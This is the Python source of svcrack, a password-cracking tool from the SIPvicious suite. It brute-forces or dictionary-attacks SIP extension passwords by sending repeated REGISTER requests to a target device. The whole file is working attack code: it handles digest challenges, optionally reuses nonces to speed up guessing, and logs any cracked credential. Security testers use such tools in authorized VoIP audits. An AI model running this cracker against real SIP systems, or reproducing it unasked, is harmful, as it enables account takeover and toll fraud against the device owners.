#!/usr/bin/env python
# SIPvicious password cracker - svcrack

__GPL__ = """

   SIPvicious password cracker is an online password guessing tool for SIP devices
   Copyright (C) 2007  Sandro Gauci <sandrogauc@gmail.com>

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.
   
   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.
   
   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

__author__ = "Sandro Gauci <sandrogauc@gmail.com>"
__version__ = '0.1-svn'

import socket
import select
import random
import logging
import base64


class ASipOfRedWine:
    def __init__(self,host='localhost',bindingip='',localport=5060,port=5060,username=None,crackmode=1,crackargs=None,realm=None,selecttime=0.005,compact=False,reusenonce=False,extension=None):
        from helper import dictionaryattack, numericbrute
        import logging
        self.log = logging.getLogger('ASipOfRedWine')
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        self.sock.settimeout(10)
        #self.sock.bind(('',localport))
        self.nomore = False
        self.passwordcracked = False
        self.rlist = [self.sock]
        self.wlist = list()
        self.xlist = list()
        self.challenges = list()
        self.localhost = 'localhost'
        self.dsthost,self.dstport =host,port
        if crackmode == 1:            
            self.passwdgen = numericbrute(*crackargs)
        elif crackmode == 2:
            self.passwdgen = dictionaryattack(crackargs)        
            
        self.username = username
        self.realm = realm
        self.selecttime = selecttime
        self.dstisproxy = None
        self.ignorenewnonce = True
        self.noauth = False
        self.compact=compact
        self.reusenonce = reusenonce
        self.staticnonce = None
        self.staticcid = None
        if extension is not None:
            self.extension = extension
        else:
            self.extension = username
        self.bindingip = bindingip
        self.localport = localport
        self.originallocalport = localport
    PROXYAUTHREQ = 'SIP/2.0 407 '
    AUTHREQ = 'SIP/2.0 401 '
    OKEY = 'SIP/2.0 200 '
    NOTFOUND = 'SIP/2.0 404 '
    INVALIDPASS = 'SIP/2.0 403 '
    TRYING = 'SIP/2.0 100 '
    
        
        
    def Register(self,extension,remotehost,auth=None,cid=None):
        from helper import makeRequest
        m = 'REGISTER'
        if cid is None:
            cid='%s' % str(random.getrandbits(32))
        branchunique = '%s' % random.getrandbits(32)
        cseq = 1
        localtag=None
        if auth is not None:
            cseq = 2
            localtag=base64.b64encode('%s:%s' % (auth['username'],auth['password']))            
        register = makeRequest(
                                    m,
                                    '"%s"<sip:%s@%s>' % (extension,extension,self.dsthost),
                                    '"%s"<sip:%s@%s>' % (extension,extension,self.dsthost),
                                    self.dsthost,
                                    self.dstport,
                                    callid=cid,
                                    srchost=self.localhost,
                                    branchunique=branchunique,
                                    cseq=cseq,
                                    auth=auth,
                                    localtag=localtag,
                                    compact=self.compact
                                  )
        return register

    def getResponse(self):
        from helper import getNonce,getCredentials,getRealm,getCID
        # we got stuff to read off the socket                
        buff,srcaddr = self.sock.recvfrom(8192)
        if buff.startswith(self.PROXYAUTHREQ):
            self.dstisproxy = True
        elif buff.startswith(self.AUTHREQ):
            self.dstisproxy = False
        if buff.startswith(self.PROXYAUTHREQ) or buff.startswith(self.AUTHREQ):
            nonce = getNonce(buff)
            cid  = getCID(buff)
            if self.realm is None:
                self.realm = getRealm(buff)
            if None not in (nonce,self.realm):
                if self.reusenonce:
                    if len(self.challenges) > 0:
                        return
                    else:
                        self.staticnonce = nonce
                        self.staticcid = cid
                self.challenges.append([nonce,cid])
        elif buff.startswith(self.OKEY):
            self.passwordcracked = True
            _tmp = getCredentials(buff)
            if _tmp is not None:
                crackeduser,crackedpasswd = _tmp
                self.log.info("The password for %s is %s" % (crackeduser,crackedpasswd))
            else:
                self.log.info("Does not seem to require authentication")
                self.noauth = True
        elif buff.startswith(self.NOTFOUND):
            self.log.warn("User not found")
            self.noauth = True
        elif buff.startswith(self.INVALIDPASS):
            pass
        elif buff.startswith(self.TRYING):
            pass
        else:
            self.log.error("We got an unknown response")
            self.log.debug(`buff`)
            self.nomore = True

        
    
    def start(self):
        #from helper import ,getCredentials,getRealm,getCID
        import socket
        if self.bindingip == '':
            bindingip = 'any'
        else:
            bindingip = self.bindingip
        self.log.debug("binding to %s:%s" % (bindingip,self.localport))
        while 1:
            if self.localport > 65535:
                self.log.critical("Could not bind to any port")
                return
            try:            
                self.sock.bind((self.bindingip,self.localport))
                break
            except socket.error:
                self.log.debug("could not bind to %s" % self.localport)
                self.localport += 1            
        if self.originallocalport != self.localport:
            self.log.warn("could not bind to %s:%s - some process might already be listening on this port. Listening on port %s instead" % (self.bindingip,self.originallocalport, self.localport))
            self.log.info("Make use of the -P option to specify a port to bind to yourself")

        # perform a test 1st ..
        data = self.Register(self.extension,self.dsthost)
        try:
            self.sock.sendto(data,(self.dsthost,self.dstport))
        except socket.error,err:
            self.log.error("socket error: %s" % err)
            return
        try:
            self.getResponse()
        except socket.timeout:
            self.log.error("no server response")
            return
        if self.noauth is True:
            return
        while 1:
            r, w, e = select.select(
                self.rlist,
                self.wlist,
                self.xlist,
                self.selecttime
                )
            if r:
                if self.passwordcracked:
                    break                
                # we got stuff to read off the socket
                self.getResponse()
            else:
                if self.passwordcracked:
                    break
                if self.nomore is True:
                    try:
                        while not self.passwordcracked:
                            self.getResponse()                            
                    except socket.timeout:
                        break
                # no stuff to read .. its our turn to send back something
                if len(self.challenges) > 0:
                    # we have challenges to take care of
                    auth = dict()
                    auth['username'] = self.username
                    auth['realm'] = self.realm
                    if self.reusenonce:
                        auth['nonce'] = self.staticnonce
                        cid = self.staticcid
                    else:
                        auth['nonce'],cid = self.challenges.pop()
                    auth['proxy'] = self.dstisproxy
                    try:                        
                        auth['password'] = self.passwdgen.next()                        
                    except StopIteration:
                        self.log.info("no more passwords")
                        self.nomore = True
                        continue
                else:
                    auth = None
                    cid = None
                data = self.Register(self.extension,self.dsthost,auth,cid)                
                try:
                    self.sock.sendto(data,(self.dsthost,self.dstport))
                except socket.error,err:
                    self.log.error("socket error: %s" % err)
                    break

if __name__ == '__main__':
    from optparse import OptionParser
    from datetime import datetime
    from helper import getRange
    import logging
    logging.basicConfig(level=logging.DEBUG)
    usage = "usage: %prog -u username [options] target\r\n"
    usage += "example: %prog -u100 -d dictionary.txt 10.0.0.1"
    parser = OptionParser(usage,version="%prog v"+str(__version__)+__GPL__)
    parser.add_option('-v', '--verbose', dest="verbose", action="count",
                      help="Increase verbosity")
    parser.add_option('-q', '--quiet', dest="quiet", action="store_true",
                      default=False,
                      help="Quiet mode")
    parser.add_option("-p", "--port", dest="port", default=5060, type="int",
                  help="destination port of the SIP Registrar", metavar="PORT")
    parser.add_option("-u", "--username", dest="username",
                  help="username to try crack", metavar="USERNAME")
    parser.add_option("-t", "--timeout", dest="selecttime", type="float",
                      default=0.005,
                  help="timeout for the select() function. Change this if you're losing packets",
                  metavar="SELECTTIME")        
    parser.add_option("-d", "--dictionary", dest="dictionary", type="string",
                  help="specify a dictionary file with passwords",
                  metavar="DICTIONARY")        
    parser.add_option("-r", "--range", dest="range", default="100-999",
                  help="specify a range of numbers. example: 100-200,300-310,400",
                  metavar="RANGE")
    parser.add_option("-e", "--extension", dest="extension", 
                  help="Extension to crack. Only specify this when the extension is different from the username.",
                  metavar="EXTENSION")
    parser.add_option("-z", "--zeropadding", dest="zeropadding", type="int", default=0,
                  help="""the number of zeros used to padd the password.
                  the options "-r 1-9999 -z 4" would give 0001 0002 0003 ... 9999""",
                  metavar="PADDING")
    parser.add_option("-c", "--enablecompact", dest="enablecompact", default=False, 
                  help="enable compact mode. Makes packets smaller but possibly less compatable",
                  action="store_true",
                  )
    parser.add_option("-n", "--reusenonce", dest="reusenonce", default=False, 
                  help="Reuse nonce. Some SIP devices don't mind you reusing the nonce (making them vulnerable to replay attacks). Speeds up the cracking.",
                  action="store_true",
                  )
    parser.add_option("-R", "--reportback", dest="reportBack", default=False, action="store_true",
                  help="Send the author an exception traceback. Currently sends the command line parameters and the traceback",                  
                  )
    (options, args) = parser.parse_args()
    if len(args) != 1:
        parser.error("provide one hostname")
    else:
        host=args[0]
    if options.username is None:
        parser.error("provide one username to crack")
    
    if options.dictionary is not None:
        crackmode=2
        try:
            dictionary = open(options.dictionary,'r')
        except IOError:
            logging.error("could not open %s" % options.dictionary            )
        crackargs = dictionary
    else:
        crackmode = 1
        rangelist = getRange(options.range)        
        crackargs = (rangelist,options.zeropadding)
    sipvicious = ASipOfRedWine(
                    host,
                    username=options.username,
                    selecttime=options.selecttime,
                    compact=options.enablecompact,
                    crackmode=crackmode,
                    crackargs=crackargs,
                    reusenonce=options.reusenonce,
                    extension=options.extension
                    )
    
    start_time = datetime.now()
    logging.info("scan started at %s" % str(start_time))
    try:        
        sipvicious.start()
    except KeyboardInterrupt:
        logging.warn('caught your control^c - quiting')
    except Exception, err:
        import traceback
        from helper import reportBugToAuthor
        if options.reportBack:
            logging.critical( "Got unhandled exception : sending report to author" )
            reportBugToAuthor(traceback.format_exc())
        else:
            logging.critical( "Unhandled exception - please run same command with the -R option to send me an automated report")
            pass
        logging.exception( "Exception" )            
    end_time = datetime.now()
    total_time = end_time - start_time
    logging.info("Total time: %s" % total_time)
